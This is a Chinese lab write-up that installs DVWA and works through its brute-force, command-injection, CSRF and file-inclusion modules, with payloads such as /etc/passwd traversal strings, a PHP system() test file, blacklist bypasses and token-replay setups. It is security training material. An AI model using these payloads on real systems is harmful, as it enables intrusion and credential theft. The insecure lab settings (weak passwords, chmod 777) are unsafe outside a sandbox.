## 部署
安装依赖环境

```plain
sudo apt install -y apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php git unzip
```

启动服务

```plain
sudo systemctl start mariadb
sudo systemctl enable mariadb
```

设置密码（我用了123456）

```plain
sudo mariadb-secure-installation
```

替换国内源

```plain
vim /etc/apt/sources.list

官方源注释掉，并添加国内镜像源。例如：
# 官方源
# deb http://http.kali.org/kali kali-rolling main non-free contrib

# 中科大
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib

# 阿里云
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib

# 清华大学
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free

# 浙大
deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free

# 东软大学
deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib

# 重庆大学
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib

```

进入/var/www/html页面拉取dvwa

```plain
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
```

配置数据库：登录mysql，创建用户

```plain
sudo mysql -u root -p

CREATE DATABASE dvwa;
CREATE USER 'dvwa_user'@'localhost' IDENTIFIED BY '123456';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

修改DVWA配置

```plain
# 复制配置文件模板
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php

# 编辑配置文件
sudo nano config.inc.php
# 修改以下
$_DVWA['db_server']   = 'localhost';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user']     = 'dvwa_user';
$_DVWA['db_password'] = '123456'; 
```

修改PHP配置

```plain
sudo nano /etc/php/*/apache2/php.ini
# 确保以下
allow_url_include = On
display_errors = On

#重启Apache
sudo systemctl restart apache2
```

设置权限

```plain
sudo chmod 777 /var/www/html/DVWA/hackable/uploads/
sudo chmod 777 /var/www/html/DVWA/config/
```

访问 DVWA 完成安装

浏览器访问：[http://localhost/DVWA/setup.php](http://localhost/DVWA/setup.php)

点击 Create / Reset Database 按钮初始化数据库。

使用默认账号登录：

用户名：admin

密码：password

再次启动 <font style="background-color:rgb(236, 236, 236);">sudo systemctl start apache2 mysql</font>

## 一、Brute Force（暴力破解）
### 前言
利用抓包软件抓包，来不断对单个用户名穷举密码的操作

注：密码本和用户名本里面应当有所谓的用户名和密码

### 难度low
审计代码

```plain
<?php

if( isset( $_GET[ 'Login' ] ) ) { //检查URL中是否有名为Login的GET参数（如?Login=1），存在则执行登录验证
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ]; // 密码通过URL明文传输（GET请求）
    $pass = md5( $pass ); // 使用未加盐的MD5哈希

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; //直接将用户输入拼接进SQL语句，攻击者可构造恶意输入绕过登录
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    // or die(...) 会在失败时显示详细数据库错误信息

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>"; // 成功登录标识
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

服务器只验证了是否有设置参数Login，没有防爆破；



随便输个账号密码，用burpsuite抓包，右键send ro intruder

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752125817156-680271df-3620-4da6-8e8d-cf5454bfc0b8.png)

给username和password这两个字段后面的内容添加add$，把attack type的值设置为cluster bomb；

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752126183053-848947d6-a41b-4f10-8f93-102d77c42622.png)

在payloads中分别给payload 1和payload 2设置字典路径；

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752126994109-6305bb43-9c78-4111-a2fc-3e693f0d56d2.png)

Load添加字典，我这里用户加了/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752127155030-9f477964-3a87-4f05-af7e-afa064b5b80f.png)

密码字典我去解压了一下 sudo gunzip /usr/share/wordlists/rockyou.txt.gz ，加了/usr/share/wordlists/rockyou.txt

点击开始破解

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752127183340-76eb5a7c-4f2f-40cc-88d7-f9a2c05a2828.png)

不好意思，他字典里的实在是太多等起来太慢了，还是我手动加几个测试一下就好了

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752128415369-00b4f49a-ea6b-4f2f-b62f-102faf73d20f.png)

看长度这个的和其他都不一样说明这个是对的

### 难度medium
审计代码

```plain
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    // 使用mysqli_real_escape_string() 输入转义，处理特殊字符（如'、"、\等），有效防御SQL注入
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    // 密码转义+MD5哈希
    // 使用mysqli_real_escape_string() 输入转义，处理特殊字符（如'、"、\等），有效防御SQL注入
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        // 暴力破解防护 sleep(2)
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
?>
```

和low级别操作起来是一样的，因为它只是单纯的加了个登陆失败后sleep( 2 );，除了速度变慢一点之外没有区别。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752129504290-e3c8729a-7e3a-48cf-85c9-0c73086423ce.png)

### 难度high
审计代码

```plain
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    // CSRF令牌验证
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    // 反斜杠处理,解决magic_quotes_gpc开启时的双重转义问题,避免原始输入中的\'被转义为\\'导致数据异常
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    // 反斜杠处理,解决magic_quotes_gpc开启时的双重转义问题,避免原始输入中的\'被转义为\\'导致数据异常
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        // 登录失败的随机延迟
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
// 全局CSRF令牌生成,确保每次会话使用新令牌
generateSessionToken();

?>


```

加入了Token抵御CSRF攻击，提交了四个参数：username、password、Login以及多出来的user_token。

用burpsuite抓包，send to <font style="color:rgb(51, 51, 51);">intrude</font>

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752130754781-1b58367c-a781-4588-938c-fe852a0552ac.png)

有user_token参数

add$ password和user_token这两个参数，选择攻击模式为pitchfock（草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。）

设置参数，在settings选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，但是由于kali带的免费版这个默认就是1而且不能改我就不需要操作了；然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752130863248-19d815ed-a0af-4139-839d-492d38aa12d8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752131865470-20778828-45c3-4014-b074-9ac000e5860f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752131558052-d588ef09-3a9f-4a14-adac-cce20d876822.png)

记录一下这个值 84327d91c063d90a38bd5443e87203f8

设置payload，password参数还是一样设置，user_token参数设置为：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752131989758-dc5072f9-97bc-4789-9c86-2a9e0d389783.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752133205145-27819349-2628-4dc5-9104-43b67650f596.png)

我在这里纠结了一下为什么教程都先用两个参数试，然后我用cluster bomb三个参数去试了下也成功了，可能作者的意图就是让人体验下pitchfock这个模式吧。。

emm，感觉脚本也可以实现，就先不弄了；

## 二、命令注入 （Command Injection）
### 前言
命令执行漏洞是一种常见的网络安全漏洞，它允许攻击者通过向应用程序发送恶意输入，执行任意系统命令或者其他恶意操作。这种漏洞通常存在于允许用户输入命令并将其传递给操作系统执行的应用程序中，比如Web应用程序中的表单、URL参数或者其他用户输入的地方。攻击者利用这种漏洞可以执行以下操作：

远程命令执行（RCE）：攻击者可以通过发送特定的恶意输入，使目标应用程序执行远程服务器上的任意命令。这可能导致服务器被完全接管，或者在服务器上执行潜在破坏性的操作。

本地命令执行：攻击者可以在受影响的应用程序上执行本地系统命令，这可能导致攻击者获取敏感信息、修改系统配置或者执行其他恶意操作。

Shell注入：攻击者通过注入恶意命令到受影响应用程序的命令行或者Shell环境中，从而执行未经授权的操作。

提权攻击：通过执行恶意命令，攻击者可以利用漏洞提升其在系统中的权限，从而获取更大的访问权限。

总的来说就是服务端没有对执行函数做严格过滤，导致我们可以插入恶意的命令并被执行。

```plain
# 命令连接符 windows和linux环境下都支持

command1 && command2   先执行command1后执行command2

command1 | command2     只执行command2

command1 & command2    先执行command2后执行command1
```

### 难度low
审计代码

```plain
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

没有对输入的数据作出任何过滤

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752197741996-535baeca-ab1e-402c-92e2-e472b308e533.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752198339969-9c83cc0b-cfcf-4c73-965d-c24ce126ea88.png)

### 难度medium
代码审计

```plain
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    // 创建了一个简单的黑名单：将&&和;替换为空字符串
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
```

除了过滤了&& 和 ；其他没区别

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752198758296-10e39efe-98e5-43ed-b4f5-fd9c566ed0ab.png)

### 难度high
审计代码

```plain
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '', // | 后有一个空格
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

也是一样的设了黑名单，但是有个地方设置的有问题，| 后面加了个空格，所以用 | 继续试

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752199534302-04a5ef41-34f5-485e-ad93-1be1e6cae200.png)

## 三、跨站请求(csrf)
### 前言
CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。

### 难度low
审计代码

```plain
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键；

从源代码可以看出这里只是对用户输入的两个密码进行判断，看是否相等。不相等就提示密码不匹配。密码还是通过URL明文传输的；相等的话，查看有没有设置数据库连接的全局变量和其是否为一个对象。如果是的话，用mysqli_real_escape_string（）函数去转义一些字符，如果不是的话输出错误。 （sql注入：虽然使用了mysqli_real_escape_string，但dvwaCurrentUser()返回值未经验证，可通过构造恶意用户名 UPDATE users SET password = '哈希值' WHERE user = 'admin' -- ' 修改admin密码）；是同一个对象的话，再用md5进行加密，再更新数据库；

先输入两个不一样的密码试一下：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752200871354-aecc2bbc-3583-4ea2-9d28-edc659070957.png)

可是看到确实就是分析的这样，直接在url里把密码改成一致的再开个页面访问下

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752200967703-597933d0-7fd1-4fe7-936c-6625a40bb27d.png)

### 难度medium
审计代码

```plain
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

新增安全层：Referer验证，检查请求头中的HTTP_REFERER是否包含当前服务器名；

先改个密码，burpsuite抓包看下

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752201933171-c533ab4e-2b41-490e-a320-84cf6ccea02e.png)

然后开个新页面把链接复制过去抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752202036409-6b41bac9-6845-4965-8a5a-75733483d85f.png)

可以看到少了这个Referer参数，加一个Referer字段，然后值只要设置成包含了主机头127.0.0.1就行了，我加的是Referer: [http://localhost/](http://localhost/) 也成功了

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752202927077-9caab2c3-be77-4644-aaa4-34b0d9196715.png)

### 难度high
审计代码

```plain
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
// 生成新的token
generateSessionToken();

?>
```

新增了Anti-CSRF Token机制，每次会话都验证新的token

用之前的方法会报错

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752211036904-1bdb651c-710c-421b-bf66-68acb3cdface.png)

利用同源策略绕过Token保护 + XSS漏洞组合攻击

```plain
攻击者->>目标用户： 发送恶意链接
    目标用户->>DVWA: 访问正常页面(获取有效Token)
    DVWA-->>目标用户: 返回含Token的页面
    目标用户->>攻击者服务器: 触发恶意脚本(泄露Token)
    攻击者服务器->>攻击者: 转发Token
    攻击者->>目标用户: 构造含Token的攻击URL
    目标用户->>DVWA: 执行密码修改请求
    DVWA-->>目标用户: 密码修改成功
```

这里用别的方法

在burpsuite里下载CSRF Token Tracker

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752204242335-35a1b361-9516-4b48-9bf3-76fd814291a3.png)CSRF Token Tracker的主要功能：

自动获取 CSRF Token：插件能够自动从服务器响应中提取 CSRF Token，并将其添加到后续的请求中。

自动更新 Token：在多次请求中，Token 会自动更新，确保每次请求都使用最新的 Token。

绕过 CSRF 防护：通过自动处理 Token，该插件可以帮助测试人员绕过网站的 CSRF 防护，进行诸如暴力破解、数据包重放等测试。



在burpsuite里下载Logger++

Logger++ 是 Burp Suite 中一款功能强大的日志记录和分析插件，提供了比 Burp 自带日志更强大的记录、过滤和搜索功能，可以记录所有经过 Burp 的 HTTP/HTTPS 流量，为查看repeater修改密码后的报文，安装logger插件。



配置CSRF Token Tracker

当前访问host为localhost，token参数名为user_token，把包中的user_token值复制到CSRF Token Tracker中实现自动识别token值。勾选sync requests based on the following rules

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752213203936-0ab977df-6095-4fb7-a0f5-441c3214ae75.png)

再去repeat

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752214141814-005518e1-ce79-4d70-bf7d-7d5ec2386e8e.png)

成功了，然后我再用之前的链接再去repeat一下

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752214393142-c23c7938-5122-4ec9-ad0e-9f1a3dae0b8a.png)

也是成功了，可以看到CSRF Token Tracker中的user_token值自动更新了：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752214427403-e730bcb7-09e7-4f6e-b752-7f4413948fb4.png)

## 四、文件包含（File Inclusion）
### 前言
文件包含：

开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。

文件包含漏洞：

开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。

文件包含漏洞用到的函数：

```plain
require:找不到被包含的文件，报错，并且停止运行脚本。
include:找不到被包含的文件,只会报错，但会继续运行脚本。
require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。
include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。
```

目录遍历与文件包含的区别：

目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。

文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。

文件包含特征：

```plain
?page=a.php
?home=b.html
?file=content
```

检测方法：

```plain
?file=../../../../etc/passwd
?page=file:///etc/passwd
?home=main.cgi
?page=http://www.a.com/1.php
http://1.1.1.1/../../../../dir/file.txt
```

### <font style="color:rgb(51, 51, 51);">难度low</font>
审计代码

```plain
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

没有任何过滤措施。

根据页面url访问phpinfo.php

```plain
http://localhost/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/phpinfo.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752479195265-bf8d8933-abbd-4b86-9851-df28808ba4ba.png)

其实我访问[http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/DVWA/phpinfo.php](http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/DVWA/phpinfo.php)看日志也是成功的：sudo tail -f /var/log/apache2/error.logphpinfo.php被成功包含，但是页面会显示登录页面，之后看了下，phpinfo.php文件包含了DVWA的认证检查，dvwaPageStartup( array( 'authenticated') ) 会检查用户是否已登录，如果没有就重定向到登录页面。奇怪我明明登陆了来着

可以访问到，再试试访问个不存在的文件

```plain
http://localhost/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/notme.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752479267886-413835f0-59b5-40d0-96c8-dc55ac878c88.png)

报错

```plain
arning: include(/var/www/html/DVWA/notme.php): Failed to open stream: No such file or directory in /var/www/html/DVWA/vulnerabilities/fi/index.php on line 36

Warning: include(): Failed opening '/var/www/html/DVWA/notme.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/DVWA/vulnerabilities/fi/index.php on line 36
```

进入/var/www/html/DVWA/vulnerabilities/fi/目录下创建测试文件test.txt，内容：<font style="color:rgb(51, 51, 51);"><?php system('ifconfig');?></font>

```plain
echo '<?php system("ifconfig"); ?>' | sudo tee /var/www/html/DVWA/vulnerabilities/fi/test.txt
```

访问url：[http://localhost/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/vulnerabilities/fi/test.txt](http://localhost/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/vulnerabilities/fi/test.txt)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752479823984-303697c6-bc02-4977-84a6-433f4d875952.png)

成功返回了

### 难度medium
审计代码

```plain
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
```

<font style="color:rgb(51, 51, 51);">代码使用 str_replace函数 对http:// 和 https://进行了过滤，防止了远程包含漏洞的产生，也过滤了 ../ 和 ..\ 防止了进行目录切换的包含。但是使用 str_replace 函数进行过滤是不安全的，因为可以使用双写绕过。例如，包含 hthttp://tp://xx 时，str_replace 函数只会过滤一个 http://  ，所以最终还是会包含到 http://xx</font>

访问url：[http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/DVWA/phpinfo.php](http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/DVWA/phpinfo.php)

报错

```plain

Warning: include(localhost/DVWA/phpinfo.php): Failed to open stream: No such file or directory in /var/www/html/DVWA/vulnerabilities/fi/index.php on line 36

Warning: include(): Failed opening 'localhost/DVWA/phpinfo.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/DVWA/vulnerabilities/fi/index.php on line 36
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1752482029391-65a488ea-708f-4e14-860b-980221b4e5f0.png)

DVWA过滤后：localhost/DVWA/phpinfo.php（移除了http://）

系统尝试包含：localhost/DVWA/phpinfo.php（作为本地文件路径）

结果：找不到这个本地文件，报错

访问url：[http://localhost/DVWA/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/etc/passwd](http://localhost/DVWA/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/etc/passwd)

返回：

```plain
Warning: include(http://127.0.0.1/etc/passwd): Failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in /var/www/html/DVWA/vulnerabilities/fi/index.php on line 36
Warning: include(): Failed opening 'http://127.0.0.1/etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/DVWA/vulnerabilities/fi/index.php on line 36
```

绕过成功了

### 难度high
审计代码

```plain
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```

high级别的代码对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not  found。

